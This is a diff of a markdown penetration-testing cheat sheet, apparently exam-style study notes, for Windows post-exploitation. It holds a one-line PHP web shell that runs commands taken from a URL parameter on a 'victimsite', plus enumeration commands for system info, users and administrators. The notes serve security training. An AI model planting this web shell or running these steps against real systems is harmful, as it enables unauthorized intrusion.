@@ -6,19 +6,19 @@
 ## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt
 
 ## Web Shell for Windows 
-- [PHP Web Shell]
-    Test if PHP works
+- PHP Web Shell
+    * Test if PHP works
     ```phpinfo
     <?php phpinfo(); ?>
     ```
-    Command Execution
+    * Command Execution
     ```php webshell
     <?php echo(system($_GET["cmd"])); ?>
     ```
-    Go to http://victimsite.com/test.php?cmd=dir for command execution 
+    * Go to http://victimsite.com/test.php?cmd=dir for command execution 
 
 ## Process
-- [systeminfo]
+- systeminfo
 	* Gives us system info 
 
 	* Check Hot Fixes
@@ -36,11 +36,11 @@
 		systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
 		```
 		* Google Output
-- [wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%]
+- wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 	* Get architecture
 	* x86 = 32 bit machine
 	* x64 = 64 bit machine
-- [Environment Variables]
+- Environment Variables
 	* Command Prompt
 	```env
 	set
@@ -49,9 +49,9 @@
 	```
 	Get-ChildItem Env: | ft Key,Value
 	```
-- [net users]
+- net users
 	* See the users 
-- [net localgroup Administrator(s)]
+- net localgroup Administrator(s)
 	* See which users are in the Administrator Group
 
 
